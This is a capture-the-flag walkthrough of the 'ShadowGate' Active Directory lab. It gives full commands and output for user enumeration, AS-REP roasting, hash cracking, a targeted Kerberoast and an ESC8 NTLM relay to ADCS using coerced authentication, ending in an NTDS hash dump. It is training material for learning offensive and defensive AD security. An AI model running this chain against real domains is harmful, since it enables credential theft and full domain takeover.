---
source: Hack Smarter
title: ShadowGate
difficulty: easy
tags: Active Directory, ADCS, ESC8
summary: Performing user recon reveals domain users. One of the users is vulnerable to AS-REP Roasting which allows the attacker to gain further insight on the domain. Using this information, the attacker can take over another domain account and abuse
their privileges to perform an NTLM Relay attack against the Active Directory Certificate Services, leading to domain compromise.
---

## [01] Port Scan and Service Discovery

```term
$ nmap -sC -sV -vv -oN scans/nmap_top1000.txt 10.1.146.118

PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-08-29 00:57:41Z)
135/tcp  open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Issuer: commonName=shadow-DC01-CA/domainComponent=shadow
445/tcp  open  microsoft-ds? syn-ack ttl 126
464/tcp  open  kpasswd5?     syn-ack ttl 126
593/tcp  open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Issuer: commonName=shadow-DC01-CA/domainComponent=shadow
3268/tcp open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Issuer: commonName=shadow-DC01-CA/domainComponent=shadow
3269/tcp open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Issuer: commonName=shadow-DC01-CA/domainComponent=shadow
3389/tcp open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: SHADOW
|   NetBIOS_Domain_Name: SHADOW
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: shadow.gate
|   DNS_Computer_Name: DC01.shadow.gate
|   Product_Version: 10.0.20348
|_  System_Time: 2026-08-29T00:58:26+00:00
5985/tcp open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```
## [02] Finding Users with nxc, Performing AS-REP Roasting

```term
$ nxc smb DC01.shadow.gate -u '' -p '' --users-export users.txt

SMB         10.1.146.118    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
SMB         10.1.146.118    445    DC01             [+] shadow.gate\:
SMB         10.1.146.118    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                 
SMB         10.1.146.118    445    DC01             Administrator                 2026-01-11 11:33:05 0       Built-in account for administering the computer/domain
SMB         10.1.146.118    445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.1.146.118    445    DC01             krbtgt                        2026-01-12 02:45:27 0       Key Distribution Center Service Account
SMB         10.1.146.118    445    DC01             ATHENA                        2026-03-04 15:23:19 0
SMB         10.1.146.118    445    DC01             mbrownlee                     2026-03-04 15:24:05 0
SMB         10.1.146.118    445    DC01             bbrown                        2026-01-15 14:24:07 0
SMB         10.1.146.118    445    DC01             jtrueblood                    2026-04-28 18:14:47 0
SMB         10.1.146.118    445    DC01             jsmith                        2026-03-04 15:26:29 0
SMB         10.1.146.118    445    DC01             clocke                        2026-03-04 15:24:32 0
SMB         10.1.146.118    445    DC01             tclarke                       2026-03-04 15:25:33 0
SMB         10.1.146.118    445    DC01             jbradford                     2026-03-04 15:24:59 0
SMB         10.1.146.118    445    DC01             amoss                         2026-03-04 15:25:52 0
SMB         10.1.146.118    445    DC01             [*] Enumerated 12 local users: SHADOW
SMB         10.1.146.118    445    DC01             [*] Writing 12 local users to users.txt

```

Using `nxc` we were able to gather a list of users. We can now use the impacket suite to perform an `AS-REP Roast` attack. This attack will target the Kerberos protocol to exploit accounts that have Kerberos pre-authentication disabled.

```term
$ impacket-GetNPUsers -usersfile users.txt -dc-ip 10.1.146.118 -dc-host shadow.gate shadow.gate/
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User ATHENA doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mbrownlee doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bbrown doesn't have UF_DONT_REQUIRE_PREAUTH set
!!$krb5asrep$23$jtrueblood@SHADOW.GATE:a04edc739cbbe564936d874b362edfbb$7a2d817104a81d8c42c68cc8ef8a9da623d0648ff50bfd358037522afd1152566c2722e1bed15adefb83bc362a1b22628bdab792d797413b12a1df720f382aaaff07e26c22e1de171eac060356a53cf9a5288fbdef7f91b4f1c403caf8ba7e39dea7a4901e33046156e7958ef5182e53a7528bc9cf1ff7dc8926fbde82258bcb3a7fea8da7a59f2f7edccc3e48375c392eb19a867199638a3b630067148ce56ae3ef47577aa9ad6bf6dd0b4b6eb3e3f062b0974ac44d4e7796d7deaa4c8f025dc074ad63ca3663ba076d725b8cad8d68e299cbb5b8312f733660798e7d3b34ff04ced829adbccfad9904
[-] User jsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User clocke doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tclarke doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jbradford doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User amoss doesn't have UF_DONT_REQUIRE_PREAUTH set
```

We get a hash for `jtrueblood`. We can feed this to `hashcat` to attempt to crack the password.

```term
$ hashcat -m 18200 -a 0 jtrueblood.hash /usr/share/wordlists/rockyou.txt

!!$krb5asrep$23$jtrueblood@SHADOW.GATE:2e8a6893855915462621e123b199d763$bd812178d7d01c322298b5b0c67df5bb21f2abd20228762831aed08c365f14f17f5b5e7a4d30d91896da2d2fb81994c798b85884a2742ff796398d0a47d94f2ff0d150aba8a95272325f9d74d81f0ea61b427a16860f64680b13edb5a679c2cdbceac6b029b0f02424af212bfae58bd592918544c858094e1b8f568aeb90e722204fb049a66ed48fd449c1a0d0692d38fcde7bd22bf43cdaf22b17b9a4b610fee320f5a86a87462598f2b5f3af5b408593c4d88ef3e9bb0ff308fb7b3ca95827c91ec1740bf4b80e1336623a94e9b1d11886d1f2fe9594675ac4e814b618de14cc5facf6f0aaf5416546:xxxxxxxx
```

## [03] Kerberoasting "bbrown"

Now that we have our first set of credentials, we can dig into `smb`.

```term
$ nxc smb DC01.shadow.gate -u 'jtrueblood' -p 'xxxxxxxx' -M spider_plus

SMB         10.1.146.118    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
SMB         10.1.146.118    445    DC01             [+] shadow.gate\jtrueblood:xxxxxxxx
SPIDER_PLUS 10.1.146.118    445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.1.146.118    445    DC01             [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.1.146.118    445    DC01             [*]     STATS_FLAG: True
SPIDER_PLUS 10.1.146.118    445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.1.146.118    445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.1.146.118    445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.1.146.118    445    DC01             [*]  OUTPUT_FOLDER: /home/grehaus/.nxc/modules/nxc_spider_plus
SMB         10.1.146.118    445    DC01             [*] Enumerated shares
SMB         10.1.146.118    445    DC01             Share           Permissions            Remark
SMB         10.1.146.118    445    DC01             -----           -----------            ------
SMB         10.1.146.118    445    DC01             ADMIN$                                 Remote Admin
SMB         10.1.146.118    445    DC01             C$                                     Default share
SMB         10.1.146.118    445    DC01             CertEnroll      READ                   Active Directory Certificate Services share
SMB         10.1.146.118    445    DC01             IPC$            READ                   Remote IPC
SMB         10.1.146.118    445    DC01             NETLOGON        READ                   Logon server share
SMB         10.1.146.118    445    DC01             SYSVOL          READ                   Logon server share
SPIDER_PLUS 10.1.146.118    445    DC01             [+] Saved share-file metadata to "/home/grehaus/.nxc/modules/nxc_spider_plus/10.1.146.118.json".
SPIDER_PLUS 10.1.146.118    445    DC01             [*] SMB Shares:           6 (ADMIN$, C$, CertEnroll, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.1.146.118    445    DC01             [*] SMB Readable Shares:  4 (CertEnroll, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.1.146.118    445    DC01             [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.1.146.118    445    DC01             [*] Total folders found:  22
SPIDER_PLUS 10.1.146.118    445    DC01             [*] Total files found:    9
SPIDER_PLUS 10.1.146.118    445    DC01             [*] File size average:    1.4 KB
SPIDER_PLUS 10.1.146.118    445    DC01             [*] File size min:        23 B
SPIDER_PLUS 10.1.146.118    445    DC01             [*] File size max:        4.8 KB
```

Let's look at the contents.

```term
$ cat /home/grehaus/.nxc/modules/nxc_spider_plus/10.1.146.118.json

{
!!    "CertEnroll": {
!!        "DC01.shadow.gate_shadow-DC01-CA.crt": {
            "atime_epoch": "2026-01-11 21:00:31",
            "ctime_epoch": "2026-01-11 21:00:31",
            "mtime_epoch": "2026-01-11 21:00:31",
            "size": "877 B"
        },
        "nsrev_shadow-DC01-CA.asp": {
            "atime_epoch": "2026-01-11 21:00:58",
            "ctime_epoch": "2026-01-11 21:00:58",
            "mtime_epoch": "2026-01-11 21:00:58",
            "size": "323 B"
---snip---
```

Nothing too interesting file wise, but we gather information on the `Active Directory Certificate Services (ADCS)`. We can start collecting Bloodhound data to see what our next steps are.

```term
$ python3 bloodhound.py -c all -d shadow.gate -u 'jtrueblood' -p 'xxxxxxxx' -dc DC01.shadow.gate -ns 10.1.146.118
```

Navigating to our Bloodhound instance and checking `Outbound Object Control` for jtrueblood, we can see that jtrueblood has `GenericWrite` over bbrown. Bloodhound states the following:

```term
Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user.
```

It also gives us the link to the respective tools to perform this attack. There are two options here, a `Targeted Kerberoast` or a `Shadow Credentials Attack`. I chose the Targeted Kerberoast.

```term
$ python3 /opt/targetedKerberoast/targetedKerberoast.py -v -d 'shadow.gate' -u 'jtrueblood' -p 'xxxxxxxx'

[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (bbrown)
!![+] Printing hash for (bbrown)
$krb5tgs$23$*bbrown$SHADOW.GATE$shadow.gate/bbrown*$991200c4df0fa367312ee5e8e05d3ba9$15ed588b3507978f7363fb234d9a2859e138f4bd11c79030061c7e1d4e380e2d1212560747748fcf8cf58ef109812b5f68448eb72b1ce487d703fd40624d77ade8fd8acc2fbc79ae5285476ba78ea5ce69e8bab336756ac06672ed72b29d58da7e7876337d469cf41b85861309a5f968b200ef616bd847d0e223fde1dc72c8e8ce23b22c30d17ae506b2033e29ba3b3a4e275a2ddaf17e05397eb5ef4f63dd392ccc6ae53ef6bc65acee908de6163f29fb00b13a606f1a0475e5c8e0668359439b0e341ca5179de7f08ff44abeedc06d434fa2b90f3eb118ff0cd6cd31bc68e27af858dcedadf590d6d6977286c321957240c27cb6f66d8f7801bfef1e5eb630013495ccc14a23736c3a0b9a4b10408b79425a2725617ca602facf0d267d8ba71cc8a7c9eab96e7c15bc33181272c7cb221894342ed5cf00802d08ae5d6942c4db7c87bb21652ab24a8f3ec9ded3d64842867f0aa4bcdde073bb82f34371d8dfe3f019cd18d4981acdca44dadfc070e64b8af0d16f70f1a2e19fe269159380341d17c3fdbdcdce3edde3ec3a4021241fa4a483ae502b7a287113ce2b1ae8a8e94921ca560a2ff178d59250cb1bceca0fcefd5f1b6b05ee573198f150c56e0e2d2582fa3813eb8e48e3542db5c400132209b7f5a45b1de00351b0a1a74f6cb7693de3cd01e887f4864a725206b2d281464442182862673f4e0f244ea59e4498b6e2a98699cca0ca8cd1f06fbb3573f28ee6cf2308af7a6cbea7c128d15a3a306fe0bbaf03dde6b2c80acac4309a8fba4fbb9c2c76f9e89c5053af3eba55bcceead3b29526530f0c277ae4d150a4cffc5ae3a1bdac708e968d15edc5f6c4aaa27b395502f02c4e17d94ecdeb3bf8abe73d7bc74d62665168feba2c538dd52f14b5a1738885bdf643d3194634b7f779385949495b649005d558ab348dea7219210bd3d2ed11a0dd020387f1c3da400a16d39f25d165622e001b5ecde20b2e97d64688c068183b8cca182db6f8a288923f3f672332698ad73e08b9256ec0f6bf9e79ca62c90fb8db3aba6e6fd0e004afe4eded2c733b725142cdda5c8623a7302b800bbc41a8f8195cf6a15602e0eb78a8c92eb8319f35233935ef8da6bea1f4c831d934a7c85b11817c0a20e229f9619a4637a41a58219e783a62e6d41464e787fac4a1c7b9e72af921648440d65cd7ca82afdab6f9e7178b440b8bd690cd3ccc681926980d403e3df1aeb22bf338c9e3f2d25f9302c098edaea0946dc67f68d070e5bb3925f6541dec8d020587d4166c1360caddb8438f4167a908b577c44f6500a8bd7fc280076508dacafead8e35961d3d04f4a0b0a3065bd69a78db405b64507972de024926fd186ef7b47df8628f7211be589594bda54de3cbdbd74fc58fa974a181d5e98f199bb4bf50c1717feab6232efafa7954e717309dbe9c845826ae5a3d41173c2fde3fbfcbe638889b5779869477972a66d0a07fea98906febceada6c744b3ff9c831ffaab24809f2dd4ddcef487a6c82b       
[VERBOSE] SPN removed successfully for (bbrown)
```

We now have a hash for `bbrown`. We can feed this to hashcat as well to attempt to crack the password.

```term
$ hashcat -m 13100 -a 0 bbrown.hash /usr/share/wordlists/rockyou.txt

!!$krb5tgs$23$*bbrown$SHADOW.GATE$shadow.gate/bbrown*$6703e269a16430db0e740c0a8a4f68a0$89e10d1b93766efafa77139204776c118875fdd2dd7bbcc2af9b3373f8ef1e25e96fd3a8db2f99c8a5df7ea9e9793b5730b47cc5193369297b8771817700814680cbc6da7fca51690250b450655ed719e8d2a6062a7b28dc9f8e70eed81b4da10192b54c20f6b2787dfd9fd952ab81929894730f4a4a93faccb273fdd69e55c7147eb81ed289552080e552684c2bd01efcc3704324f8705116750d6236b675ce8020e0fb35a231d3537d8246baf86e6d90e80fe5d57dd13808d4958c7674eae5e4e417f8bf943fef3bdd6f5e240582f02e0f6367f4f653bff162d166c82c5e6a2199d9f2646cbd853fd590d3d5a08b4761ea0d9d8152a8507fc05e7f865c05e2ac8244fb6b264d19c16678763fe173c97269de082d2df26bff42909338bed34b5af43d387340585704c2f768573dac4185916e42dcb57e94e2ee1a98d815beb8e3ae1554ab2aed60c40e82f9eccbf50ad3548f4d183402d59557d36a97f8f1598855c06532e97eb2e67a24a4f287775659738c6eb19a1c9fa5ba275a071ef3c793bb55a1f97928a4df63d15e79d8e5a7ce1514f45f8c616cec37cfd8ff739f36741c571b51312c364379c3a71494d0a89247f3d9454d228d5e02f931a2cd8218df9c3ccb6cf65ac27373e2e2d10b70d19d662f5faac814ab09058e2ef346bb7e67c826eabda510524761c3b4162bacc803e3df5ca059a3288b66b2a62bae610ce746184d4d72f13169b3567c9b9a2138c63f47b1ab84083ddc5e4aacbbe11440e28e2b82abe9ac58858375db75c5289db69e03cea7bbbd3fdffcec7b31170c64ed64008f5bbb7dce9b68609cf9bc7750bbc80251dbddb0752789f177d070977814932cb86e08fe1887337f3f491d09b7c7fa5db74a3ad138b158b4432c4fcc473590e3df90993f0395eac46080696ffd1514c614562d5e03e16265e84fb702c5b710c357200248c47c763786dae9c97e8b19d7fc0e4ed08c8c1615ea5d73365bdd628e0bc0d31d8e77427a1040b45828fdd4cf0a5d0eee99bbaa081873131dd79d818cf75ea8ca13d1336b40ea73ac77e4295baa7007730efd160ef8b31b705cc548bbddf2a9bfe140254daf4121805467daaf77a0fce90e7158c985548547d3fa2d9ac76a043197506dc0dccbf75877675401ac7390253e0be1f935171cc65ff65cbe0ef4efe896ea998980ba634fe5cbc438eae067d84a450209e332297915f5bb20cd423abe522936c7369ab3d99172cb7b297405659f01b795c388e9f66e01c1c63174810642501b40ead8d76e426d120e0304fd93dbd7f9c83f82a4f1edd00a648479a4fe8033dfd0bab94fa9ad775f49dc691bccd00dabbf943f6afa31ece8082e18273c6eda993daf1a8442d405be37093cfe1b23a9e286f8ef612e5aa5a5bcbbec0a4be465d2cb4dd54e116c5ce79646be136ecb7d1b58714d6854a38e1d7ee7623fc51d0ad1947801b4ed2969f0cd425bc1abe0c5b0852a802f5957495c3112ff29942678fb28dd62b768444d3f2dc04d5e:xxxxxxxx
```

Looking at Bloodhound some more, we see that bbrown is a member of the `ADCS-READER` group, we should check this next.

## [04] Privilege Escalation via ADCS (ESC8)

Knowing we have some sort of access to ADCS, the first step is seeing what's there.

```term
$ certipy-ad find -u 'bbrown@shadow.gate' -p 'xxxxxxxx' -dc-ip 10.1.146.118 -vulnerable

Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'shadow-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'shadow-DC01-CA'
[*] Checking web enrollment for CA 'shadow-DC01-CA' @ 'DC01.shadow.gate'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20260901213007_Certipy.txt'
[*] Wrote text output to '20260901213007_Certipy.txt'
[*] Saving JSON output to '20260901213007_Certipy.json'
[*] Wrote JSON output to '20260901213007_Certipy.json'
```

```term
$ cat 20260828212235_Certipy.txt 

Certificate Authorities
  0
    CA Name                             : shadow-DC01-CA
    DNS Name                            : DC01.shadow.gate
    Certificate Subject                 : CN=shadow-DC01-CA, DC=shadow, DC=gate
    Certificate Serial Number           : 749A4BA2BEA3CFBC41ECDFAEE502E46C
    Certificate Validity Start          : 2026-01-12 02:50:31+00:00
    Certificate Validity End            : 2046-01-12 03:00:31+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SHADOW.GATE\Administrators
      Access Rights
        ManageCa                        : SHADOW.GATE\Administrators
                                          SHADOW.GATE\Domain Admins
                                          SHADOW.GATE\Enterprise Admins
        ManageCertificates              : SHADOW.GATE\Administrators
                                          SHADOW.GATE\Domain Admins
                                          SHADOW.GATE\Enterprise Admins
        Enroll                          : SHADOW.GATE\Authenticated Users
!!    [!] Vulnerabilities
!!      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates
```

ADCS is vulnerable to ESC8. There is a great article here `https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-3/` that goes over how to exploit this. Following along with the article gives us the following results:

`Starting the NTLM Relay Server`
```term
$ impacket-ntlmrelayx -t http://DC01.shadow.gate/certsrv/certfnsh.asp --adcs --template DomainController -smb2support

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client WINRMS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
```

`Using nxc as the Coercer`
```term
$ nxc smb DC01.shadow.gate -u 'bbrown' -p 'xxxxxxxxx' -M coerce_plus -o LISTENER=10.200.87.202

SMB         10.1.146.118    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
SMB         10.1.146.118    445    DC01             [+] shadow.gate\bbrown:xxxxxxxx
!!COERCE_PLUS 10.1.146.118    445    DC01             VULNERABLE, DFSCoerce
!!COERCE_PLUS 10.1.146.118    445    DC01             Exploit Success, netdfs\NetrDfsRemoveRootTarget
!!COERCE_PLUS 10.1.146.118    445    DC01             Exploit Success, netdfs\NetrDfsAddStdRoot
!!COERCE_PLUS 10.1.146.118    445    DC01             Exploit Success, netdfs\NetrDfsRemoveStdRoot
COERCE_PLUS 10.1.146.118    445    DC01             VULNERABLE, PetitPotam
COERCE_PLUS 10.1.146.118    445    DC01             Exploit Success, efsrpc\EfsRpcAddUsersToFile
COERCE_PLUS 10.1.146.118    445    DC01             VULNERABLE, PrinterBug
COERCE_PLUS 10.1.146.118    445    DC01             Exploit Success, spoolss\RpcRemoteFindFirstPrinterChangeNotificationEx
```

`Getting Certificate`

```term
[*] Servers started, waiting for connections
[*] (SMB): Received connection from 10.1.146.118, attacking target http://DC01.shadow.gate
[*] HTTP server returned error code 200, treating as a successful login
[*] (SMB): Authenticating connection from /@10.1.146.118 against http://DC01.shadow.gate SUCCEED [1]
[*] http:///@dc01.shadow.gate [1] -> Generating CSR...
[*] http:///@dc01.shadow.gate [1] -> CSR generated!
[*] http:///@dc01.shadow.gate [1] -> Getting certificate...
[*] (SMB): Received connection from 10.1.146.118, attacking target http://DC01.shadow.gate
[*] HTTP server returned error code 200, treating as a successful login
[*] (SMB): Authenticating connection from /@10.1.146.118 against http://DC01.shadow.gate SUCCEED [2]
!![*] http:///@dc01.shadow.gate [1] -> GOT CERTIFICATE! ID 4
[*] (SMB): Received connection from 10.1.146.118, attacking target http://DC01.shadow.gate
!![*] http:///@dc01.shadow.gate [1] -> Writing PKCS#12 certificate to ./DC01.shadow.gate.pfx
!![*] http:///@dc01.shadow.gate [1] -> Certificate successfully written to file
```

We can now get the hash using certipy.

```term
$ certipy-ad auth -pfx DC01.shadow.gate.pfx -dc-ip 10.1.146.118
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC01.shadow.gate'
[*]     Security Extension SID: 'S-1-5-21-243493930-1113464705-3012771586-1000'
[*] Using principal: 'dc01$@shadow.gate'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc01.ccache'
[*] Wrote credential cache to 'dc01.ccache'
[*] Trying to retrieve NT hash for 'dc01$'
!![*] Got hash for 'dc01$@shadow.gate': xxxxxxxx:xxxxxxxx 
```

And finally attempt to dump the remaining hashes.

```term
$ nxc smb DC01.shadow.gate -u 'dc01$' -H 'xxxxxxxx' --ntds

SMB         10.1.146.118    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
SMB         10.1.146.118    445    DC01             [+] shadow.gate\dc01$:xxxxxxxx 
SMB         10.1.146.118    445    DC01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
SMB         10.1.146.118    445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
!!SMB         10.1.146.118    445    DC01             Administrator:500:xxxxxxxx:xxxxxxxx:::
---snip---
```
